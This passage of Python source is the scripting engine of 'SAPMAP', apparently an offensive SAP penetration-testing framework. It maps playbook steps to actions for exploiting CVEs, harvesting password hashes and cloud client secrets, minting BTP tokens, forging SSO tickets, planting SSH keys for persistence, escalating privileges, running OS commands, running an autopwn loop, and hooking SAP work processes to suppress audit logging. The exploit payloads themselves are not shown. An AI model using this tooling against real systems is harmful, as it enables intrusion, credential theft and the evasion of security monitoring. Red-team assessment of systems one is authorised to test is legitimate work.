        return ("POST", f"/api/node/{target}/ssh_plant_key", {
            "channel": step.get("channel", "auto"),
            "target_user": step.get("target_user", ""),
        }, True)

    # -----------------------------------------------------------------
    # SCC harvest via LPE
    # -----------------------------------------------------------------
    if action == "harvest_scc_hashes_via_lpe":
        # LPE-elevated harvest of SCC users.xml (needs root LPE
        # on a co-located node).
        return ("POST",
                f"/api/node/{target}/harvest_scc_hashes_via_lpe", {},
                True)

    if action == "analyse_capabilities":
        # MITRE ATT&CK-style capability rules run against a pwned
        # node — outputs what's actionable given current state.
        return ("POST", f"/api/node/{target}/analyse_capabilities", {},
                True)

    # -----------------------------------------------------------------
    # Cleanup + landscape-wide sweeps
    # -----------------------------------------------------------------
    if action == "cleanup":
        # Delete every SAPMAP-created user on this node.
        return ("POST", f"/api/node/{target}/cleanup", {}, True)

    if action == "cleanup_all":
        # Delete SAPMAP-created users on every node.
        return ("POST", "/api/actions/cleanup_all", {}, True)

    if action == "propagate_all":
        # Retrieve RFCs + attempt propagation across every pwned node.
        return ("POST", "/api/actions/propagate_all", {}, True)

    if action == "check_all_ms":
        # Sweep MS_BETRUSTED across the landscape.
        return ("POST", "/api/actions/check_all_ms", {}, True)

    if action == "check_all_cve_6287":
        # Sweep CVE-2020-6287 across the landscape.
        return ("POST", "/api/actions/check_all_cve_6287", {}, True)

    if action == "check_all_cve_22536":
        # Sweep ICMAD across the landscape.
        return ("POST", "/api/actions/check_all_cve_22536", {}, True)

    if action == "check_all_router_info":
        # Sweep CVE-2017-12636 across every SAProuter node.
        return ("POST", "/api/actions/check_all_router_info", {}, True)

    if action == "check_all_snc":
        # Sweep SNC configuration across the landscape.
        return ("POST", "/api/actions/check_all_snc", {}, True)

    if action == "check_all_vulns":
        # Meta-sweep: run every vuln check across the landscape.
        return ("POST", "/api/actions/check_all_vulns", {}, True)

    # -----------------------------------------------------------------
    # Tier 3 evasion — Virtual SAP Death Star (ptrace SAL suppressor)
    # -----------------------------------------------------------------
    # Requires the SAPMAP session to have been started with
    # --allow-evasion.  The arm step deploys Julian Petersohn's
    # sap_audit_hook.linux-x86_64 to /tmp on the target and
    # PTRACE_ATTACHes to every disp+work worker — clearly destructive,
    # so tier3_arm_death_star is in DESTRUCTIVE_ACTIONS (needs
    # --confirm on the CLI).  Disarm restores the INT3 bytes and
    # detaches — safe to run always.
    if action == "tier3_arm_death_star":
        return ("POST",
                 f"/api/node/{target}/tier3_sal_death_star_launch", {
            # Empty filter_classes → suppress ALL event classes
            # (matches the GUI's "leave field empty" behavior).
            "filter_classes": step.get("filter_classes", ""),
            # Optional operator-supplied PID.  Empty / omitted → let
            # the C hook auto-attach to every work-process (the
            # normal case).
            "target_pid": step.get("target_pid", ""),
            "skip_upload": bool(step.get("skip_upload", False)),
            "skip_compile": bool(step.get("skip_compile", False)),
            "verbose": bool(step.get("verbose", True)),
        }, True)

    if action == "tier3_disarm_death_star":
        return ("POST",
                 f"/api/node/{target}/tier3_sal_death_star_stop",
                 {}, True)

    if action == "cert_dest_probe":
        # Kernel-proxied HTTP call over a cert-authenticated SM59
        # destination.  For BTP-shaped hosts (target URL contains
        # hana.ondemand.com) this auto-enumerates cloud-side
        # destinations and flags cleartext on-prem credentials.
        return ("POST",
                 f"/api/node/{target}/cert_dest_probe", {
            "destination_name": step.get("destination", ""),
        }, True)

    # -----------------------------------------------------------------
    # State management
    # -----------------------------------------------------------------
    if action == "save_state":
        # Save the current session to states/<name>.sapmap.  When
        # name is omitted the auto-save path is used.
        return ("POST", "/api/state/save", {
            "name": (step.get("name") or "").strip(),
        }, True)

    if action == "load_state":
        # Load a session file from states/<name>.sapmap.
        return ("POST", "/api/state/load", {
            "name": (step.get("name") or "").strip(),
        }, True)

    if action == "mint_btp_token":
        # Exchange a captured (uaa_url, client_id, client_secret) at
        # XSUAA's /oauth/token for a BTP access token.  Stores the
        # result in api.btp_tokens keyed by the token's region (so
        # btp_pull_destinations_for_token can chain on top).
        #
        #   target:           SAP node SID the secret was harvested from
        #   from_harvest:     when True, auto-pick a candidate from
        #                     harvest_btp_candidates instead of taking
        #                     uaa_url/client_id/client_secret manually.
        #                     Default mode for the demo playbook so the
        #                     script runs end-to-end without copy-paste.
        #   candidate_index:  which harvest candidate to use when
        #                     from_harvest=True (default 0 = first).
        #   uaa_url:          XSUAA token endpoint (full URL or bare host)
        #   client_id:        OAuth client_id (from OA2C_CLIENT or paste)
        #   client_secret:    OAuth client_secret (from /OA2C/CS_*_NN
        #                     or paste; supports path:<file>)
        return ("POST", f"/api/node/{target}/mint_btp_token", {
            "from_harvest": step.get("from_harvest", False),
            "candidate_index": step.get("candidate_index", 0),
            "uaa_url": step.get("uaa_url", ""),
            "client_id": step.get("client_id", ""),
            "client_secret": _read_token(
                step.get("client_secret", "")),
        }, True)

    raise ValueError(f"Unknown action: {action}")


def _read_token(value: str) -> str:
    """Load a secret value from disk when it's prefixed with
    `path:`; return it verbatim otherwise.  Lets scripts reference
    long JWTs / client secrets via a file path so the YAML stays
    short and the secret doesn't have to live in version control.

    File-load failures are reported on stderr / the SAPMAP console
    so the operator can correlate "uaa_url/client_id/client_secret
    are required" with the actual root cause (missing file, bad
    permissions, blank file, …) instead of guessing.
    """
    if isinstance(value, str) and value.startswith("path:"):
        path = value[5:].strip()
        try:
            with open(os.path.expanduser(path), "r") as fh:
                content = fh.read().strip()
        except FileNotFoundError:
            print(f"[SCRIPT] ERROR: secret file not found at "
                  f"{path!r} — fill it in (echo '<secret>' > "
                  f"{path}) before running the playbook.")
            return ""
        except Exception as e:
            print(f"[SCRIPT] ERROR: cannot read secret from "
                  f"{path!r}: {e}")
            return ""
        if not content:
            print(f"[SCRIPT] WARNING: secret file {path!r} exists "
                  f"but is empty — value will be treated as missing.")
        return content
    return value or ""


# Exploitation actions — these require an explicit --confirm on the CLI
# to execute.  Running them without confirmation is a no-op with a
# clearly-logged skip, so a playbook can safely be dry-run end-to-end
# (discovery + data-read) and then re-run with --confirm to land the
# exploitation stage.
DESTRUCTIVE_ACTIONS = {
    "exploit_cve_31324",
    "create_user_java",
    "scc_extract_keystore",   # pulls full backup + writes crown-jewels loot
    "harvest_scc",            # writes files to /tmp on target host
    "exploit_copyfail",       # legacy alias — patches /usr/bin/su page cache
    "exploit_linux_lpe",      # auto-picker: Copy Fail or Dirty Frag
    "exploit_windows_lpe",    # SYSTEM via EfsPotato / GodPotato / MiniPlasma
    "forge_ticket",           # writes forged MYSAPSSO2 to loot
    "forge_and_fanout",       # forge + auto-replay against trusted receivers
    "ssh_plant_key",          # writes authorized_keys — persistence marker
    "import_transport",       # STMS transport import (only dry_run is safe)
    "autopwn",                # full scan → exploit → propagate loop
    "tier3_arm_death_star",   # writes 91 KB binary, ptrace-patches disp+work text
}


# Macro actions — expanded into multiple sub-steps at load time so the
# scripting engine stays composable (each macro is just a canonical
# chain of existing actions).  All fields on the macro step (`target`,
# `delay`, `timeout`, etc.) propagate to every sub-step.
MACRO_ACTIONS = {
    # Full Java post-compromise pipeline: verify CVE-2025-31324, drop
    # SecStore + harvest UME hashes + enumerate JCo destinations, then
    # run business-impact assessment.  All steps are read-only / passive
    # (no user creation, no RCE) — for exploitation prepend an explicit
    # `exploit_cve_31324` step (requires --confirm).
    "java_pipeline": [
        {"action": "check_cve_31324"},
        {"action": "java_secstore"},
        {"action": "extract_java_hashes"},
        {"action": "read_java_destinations"},
        {"action": "impact_assess_java"},
    ],
}


def _expand_macros(steps: list) -> list:
    """Replace macro steps with their component sub-steps.

    Propagates `target` and any extra keys (delay/timeout/required) from
    the macro onto each expanded sub-step, unless the sub-step already
    defines that key.
    """
    out = []
    for step in steps:
        action = (step.get("action") or "").strip().lower()
        if action not in MACRO_ACTIONS:
            out.append(step)
            continue
        for sub in MACRO_ACTIONS[action]:
            merged = dict(step)
            merged.update(sub)
            out.append(merged)
    return out


# Human-readable labels shown in the GUI activity bar for each action.
# Only actions that aren't already long-running server-tracked tasks need
# friendly names — but including every action keeps the bar consistent.
_ACTION_LABELS = {
    "add_system":             "Adding system",
    "set_credentials":        "Saving credentials",
    "scan":                   "Scanning network",
    "check_gw":               "Checking Gateway (10KBlaze)",
    "check_ms":               "Checking MS Betrusted",
    "check_cve_31324":        "Checking CVE-2025-31324",
    "check_cve_6287":         "Checking CVE-2020-6287",
    "check_all_cve_31324":    "Sweeping CVE-2025-31324",
    "check_all_gw":           "Sweeping Gateway (10KBlaze)",
    "check_all_betrusted":    "Sweeping MS Betrusted",
    "betrusted":              "10KBlaze betrusted",
    "betrusted_chain":        "10KBlaze full chain",
    "create_user":            "Creating ABAP user",
    "create_user_java":       "Creating Java user",
    "create_user_via_rfc":    "Creating user via RFC",
    "retrieve_rfcs":          "Retrieving RFC destinations",
    "test_rfcs":              "Testing RFC destinations",
    "test_rfc_single":        "Testing RFC destination",
    "download_hashes":        "Extracting ABAP hashes",
    "download_secstore":      "Downloading ABAP SecStore",
    "extract_java_hashes":    "Extracting Java hashes",
    "java_secstore":          "Extracting Java SecStore",
    "read_java_destinations": "Reading Java JCo destinations",
    "download_java_table":    "Downloading Java table",
    "impact_assess":          "Assessing business impact",
    "impact_assess_java":     "Assessing Java business impact",
    "impact_show":            "Showing business impact",
    "impact_export":          "Exporting impact results",
    "analyze_chains":         "Analysing trust chains",
    "highlight_chain":        "Highlighting chain",
    "propagate":              "Propagating credentials",
    "deep_scan":              "Deep scanning",
    "lpe":                    "Local privilege escalation",
    "exploit_cve_31324":      "Exploiting CVE-2025-31324",
    "set_saprouter":          "Attaching SAProuter prefix",
    "set_sid":                "Renaming node SID",
    "set_instance_nr":        "Setting instance number",
    "check_router_info":      "Probing SAProuter info leak",
    "router_scan":            "Scanning internal net via SAProuter",
    "layout":                 "Rearranging map",
    "sleep":                  "Pausing",
    # BTP (cloud) actions
    "btp_set_token":              "Storing BTP token",
    "btp_enumerate":              "Enumerating BTP cloud topology",
    "btp_pull_destinations_for_token":
                                  "Pulling BTP destinations",
    "btp_test_destination":       "Testing BTP-on-prem edge",
    "btp_create_user_on_target":  "Creating user via BTP edge",
    "harvest_btp_creds":          "Harvesting BTP credentials",
    "mint_btp_token":             "Minting BTP token",
    # AutoPwn
    "autopwn":                    "Running AutoPwn convergence loop",
    # Node metadata overrides
    "set_type":                   "Setting system type",
    "set_db_type":                "Setting DB type",
    "set_os_type":                "Setting OS type",
    "set_telnet_override":        "Setting telnet override",
    # Scan / discovery
    "standard_scan":              "Standard scan",
    "rfc_system_info":            "Probing RFC system info",
    "check_default_creds":        "Probing default credentials",
    "check_snc":                  "Checking SNC configuration",
    "enum_clients":               "Enumerating clients",
    "client_roles":               "Reading client roles",
    "check_cve_22536":            "Checking CVE-2022-22536 (ICMAD)",
    "icmad_acl_bypass":           "Running ICMAD ACL bypass",
    "icmad_heapdump_pull":        "Pulling ICMAD heap dump",
    # Web Dispatcher / ICM
    "wd_rediscover":              "Rediscovering Web Dispatcher",
    "wd_admin_set_credentials":   "Setting WD admin credentials",
    "wd_admin_probe_defaults":    "Probing WD admin defaults",
    "wd_extract_icmauth":         "Extracting icmauth.txt",
    # Windows LPE
    "check_windows_lpe":          "Checking Windows LPE",
    "exploit_windows_lpe":        "Exploiting Windows LPE",
    # MYSAPSSO2 ticket forgery
    "forge_ticket":               "Forging MYSAPSSO2 ticket",
    "propagate_ticket":           "Propagating forged ticket",
    "forge_and_fanout":           "Forging + fanning out ticket",
    "discover_strustsso2":        "Discovering STRUSTSSO2 trust",
    # Table / transport / user extras
    "read_usrextid":              "Reading USREXTID",
    "read_oa2c":                  "Reading OA2C profiles",
    "verify_pp_impersonation":    "Verifying PP impersonation",
    "download_table":             "Downloading RFC table",
    "import_transport":           "Importing transport",
    "create_tcpip_dest":          "Creating TCP/IP destination",
    # OS execution
    "exec_command":               "Executing OS command",
    "sapcontrol_osexecute":       "SAPControl OSExecute",
    # SSH lateral
    "ssh_harvest":                "Harvesting SSH keys",
    "ssh_test_keys":              "Testing SSH keys",
    "ssh_plant_key":              "Planting SSH persistence",
    # SCC LPE / capabilities
    "harvest_scc_hashes_via_lpe": "Harvesting SCC hashes via LPE",
    "analyse_capabilities":       "Analysing ATT&CK capabilities",
    # Cleanup + landscape-wide
    "cleanup":                    "Cleaning up SAPMAP users",
    "cleanup_all":                "Cleaning up on every node",
    "propagate_all":              "Landscape-wide propagation",
    "check_all_ms":               "Sweeping MS betrusted",
    "check_all_cve_6287":         "Sweeping CVE-2020-6287",
    "check_all_cve_22536":        "Sweeping CVE-2022-22536 (ICMAD)",
    "check_all_router_info":      "Sweeping SAProuter info leak",
    "check_all_snc":              "Sweeping SNC config",
    "check_all_vulns":            "Sweeping every vuln check",
    # Tier 3 evasion
    "tier3_arm_death_star":       "Tier 3: arming Death Star",
    "tier3_disarm_death_star":    "Tier 3: disarming Death Star",
    # Kernel-proxied cert-auth exploitation
    "cert_dest_probe":            "Probing cert-auth destination",
    # State
    "save_state":                 "Saving session state",
    "load_state":                 "Loading session state",
}


def _script_flash_label(action: str, target: str, step: dict) -> str:
    """Build the human label that gets flashed in the GUI activity bar."""
    base = _ACTION_LABELS.get(action, action)
    # Layout mode, highlight chain start/end — add the relevant detail
    if action == "layout":
        mode = (step.get("mode") or "").strip()
        if mode: base = f"{base}: {mode}"
    elif action == "sleep":
        secs = step.get("seconds", 5)
        base = f"{base} {secs}s"
    elif action == "highlight_chain":
        start = step.get("start", ""); end = step.get("end", "")
        if start and end: base = f"{base} {start} → {end}"
    return f"{base} on {target}" if target else base


# ---------------------------------------------------------------------------
# Script execution
# ---------------------------------------------------------------------------

class ScriptRunner:
    """Execute a SAPMAP script against the local API server."""

    def __init__(self, base_url: str, script_path: str,
                 confirm: bool = False, step_delay: float = None):
        self.base_url = base_url.rstrip("/")
        self.script_path = script_path
        self.confirm = bool(confirm)
        # None = use script's top-level `step_delay` or the built-in
        # 2-second default.  CLI --step-delay overrides both.
        self.step_delay_override = step_delay
        self.step_delay = 2.0
        self.steps = []
        self.name = ""
        self.description = ""

    def load(self):
        """Load and parse the script file (YAML or JSON)."""
        with open(self.script_path, "r") as f:
            raw = f.read()

        # Try YAML first, fall back to JSON
        is_yaml = self.script_path.lower().endswith((".yaml", ".yml"))
        data = None
        if is_yaml:
            try:
                import yaml
                data = yaml.safe_load(raw)
            except ImportError:
                raise ValueError(
                    f"PyYAML is required for .yaml scripts. "
                    f"Install it with: pip3 install pyyaml\n"
                    f"Or use a .json script file instead."
                )
        if data is None:
            data = json.loads(raw)

        if not isinstance(data, dict) or "steps" not in data:
            raise ValueError("Script must have a 'steps' list")

        self.name = data.get("name", os.path.basename(self.script_path))
        self.description = data.get("description", "")
        # Resolve step delay: CLI override > script top-level `step_delay` > 2s default
        if self.step_delay_override is not None:
            self.step_delay = float(self.step_delay_override)
        elif "step_delay" in data:
            self.step_delay = float(data["step_delay"])
        # else keep built-in default (2.0s)
        self.steps = _expand_macros(data["steps"])

    def _api_call(self, method: str, path: str, payload: dict = None) -> dict:
        """Make an HTTP request to the SAPMAP API."""
        url = self.base_url + path
        if method.upper() == "GET":
            req = urllib.request.Request(url, method="GET")
        else:
            body = json.dumps(payload or {}).encode("utf-8")
            req = urllib.request.Request(
                url, data=body, method=method,
                headers={"Content-Type": "application/json"},
            )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                return json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            return {"error": f"HTTP {e.code}: {e.reason}"}
        except Exception as e:
            return {"error": str(e)}

    def _wait_for_completion(self, timeout: float = 600):
        """Poll /api/state until active_tasks is empty."""
        deadline = time.time() + timeout
        time.sleep(1)  # give the task a moment to start
        while time.time() < deadline:
            try:
                state = self._api_call("GET", "/api/state")
                tasks = state.get("active_tasks", {})
                if not tasks:
                    return True
            except Exception:
                pass
            time.sleep(1)
        return False

    def run(self, print_fn=None):
        """Execute all steps sequentially."""
        pf = print_fn or print
        total = len(self.steps)

        pf(f"[SCRIPT] === {self.name} ===")
        if self.description:
            pf(f"[SCRIPT] {self.description}")
        pf(f"[SCRIPT] {total} steps to execute")
        pf("")

        for i, step in enumerate(self.steps):
            action = step.get("action", "?")
            target = step.get("target", "")
            step_label = f"Step {i+1}/{total}"
            desc = f"{action}"
            if target:
                desc += f" on {target}"

            pf(f"[SCRIPT] {step_label}: {desc}")

            # Always flash a status label in the GUI activity bar so every
            # step — including synchronous ones and client-side ones (layout,
            # highlight_chain, sleep) that don't hit _bg() on the server —
            # shows up prominently.  Server-tracked long-running steps will
            # *additionally* render their own server label, which replaces
            # this flash immediately via the `new activity overrides hold`
            # rule.
            try:
                from sapmap_gui import ui_command as _ui
                pretty = _script_flash_label(action, target, step)
                _ui("flash_activity", label=f"{step_label}: {pretty}")
            except ImportError:
                pass

            if action in DESTRUCTIVE_ACTIONS and not self.confirm:
                pf(f"[SCRIPT] {step_label}: SKIPPED — '{action}' is "
                   f"exploitation; re-run with --confirm to execute")
                continue

            try:
                method, path, payload, wait = _map_step(step)
            except ValueError as e:
                pf(f"[SCRIPT] ERROR: {e}")
                continue

            # Special case: sleep
            if method == "SLEEP":
                seconds = payload
                pf(f"[SCRIPT] Waiting {seconds}s...")
                time.sleep(seconds)
                continue

            # Special case: show impact results in GUI + console
            if method == "IMPACT_SHOW":
                sid = payload
                results = self._api_call("GET", f"/api/node/{sid}/impact")
                items = results.get("results", [])
                with_data = [r for r in items if r.get("record_count", 0) > 0]
                if not with_data:
                    pf(f"[SCRIPT] No impact results for {sid} (run impact_assess first)")
                else:
                    pf(f"[SCRIPT] === Business Impact: {sid} ({len(with_data)} findings) ===")
                    for r in with_data:
                        icon = r.get("icon", "")
                        sev = r.get("severity_label", "?")
                        pf(f"[SCRIPT]   {icon} [{sev:8s}] {r.get('headline', '')}")
                        pf(f"[SCRIPT]              {r.get('business_message', '')[:80]}")
                # Tell the GUI to open the impact detail panel
                try:
                    from sapmap_gui import ui_command
                    ui_command("show_impact", sid=sid)
                except ImportError:
                    pass
                continue

            # Special case: export impact scenario to CSV
            if method == "IMPACT_EXPORT":
                sid = payload.get("target", "")
                scenario = payload.get("scenario", "")
                if scenario:
                    scenarios = [scenario]
                else:
                    # Export all scenarios that have data
                    results = self._api_call("GET", f"/api/node/{sid}/impact")
                    scenarios = [r["scenario"] for r in results.get("results", [])
                                 if r.get("record_count", 0) > 0]
                for sc in scenarios:
                    r = self._api_call("GET", f"/api/node/{sid}/impact/export/{sc}")
                    if r.get("status") == "ok":
                        pf(f"[SCRIPT]   Exported {r['records']} records → {r['file']}")
                    else:
                        pf(f"[SCRIPT]   Export {sc}: {r.get('error', 'failed')}")
                continue

            # Special case: rearrange the map layout (client-side only)
            if method == "LAYOUT":
                mode = payload.get("mode", "")
                pf(f"[SCRIPT]   Rearranging map → {mode}")
                try:
                    from sapmap_gui import ui_command
                    ui_command("relayout", mode=mode)
                except ImportError:
                    pass
                continue

            # Special case: highlight a chain on the map
            if method == "HIGHLIGHT_CHAIN":
                chains = self._api_call("GET", "/api/chains")
                chain_list = chains.get("chains", [])
                start = payload.get("start", "")
                end = payload.get("end", "")
                idx = payload.get("index", 0)

                # Find matching chain by start/end SIDs or by index
                target_chain = None
                if start and end:
                    for c in chain_list:
                        if c.get("start_sid") == start and c.get("end_sid") == end:
                            target_chain = c
                            break
                if not target_chain and idx < len(chain_list):
                    target_chain = chain_list[idx]

                if target_chain:
                    path_sids = target_chain.get("path_sids", [])
                    pf(f"[SCRIPT]   Highlighting chain: {' → '.join(path_sids)}")
                    try:
                        from sapmap_gui import ui_command
                        ui_command("highlight_chain", path_sids=path_sids)
                    except ImportError:
                        pass
                else:
                    pf(f"[SCRIPT]   No matching chain found (run analyze_chains first)")
                continue

            # Execute the API call
            result = self._api_call(method, path, payload)

            if result.get("error"):
                pf(f"[SCRIPT] ERROR: {result['error']}")
                if step.get("required", False):
                    pf(f"[SCRIPT] Required step failed — aborting")
                    return False
                continue

            pf(f"[SCRIPT] {step_label}: started")

            # Wait for background task to complete
            if wait:
                if not self._wait_for_completion(
                    timeout=step.get("timeout", 300)
                ):
                    pf(f"[SCRIPT] {step_label}: timed out")
                else:
                    pf(f"[SCRIPT] {step_label}: completed")
                    # Auto-show results in GUI for certain actions
                    if action == "analyze_chains":
                        try:
                            from sapmap_gui import ui_command
                            ui_command("show_chains")
                        except ImportError:
                            pass

            # Optional delay between steps.  Per-step `delay:` wins; else
            # the script-wide delay (CLI / top-level YAML / 2s default).
            delay = step.get("delay", self.step_delay)
            if delay > 0:
                time.sleep(delay)

        pf("")
        pf(f"[SCRIPT] === All {total} steps completed ===")
        return True
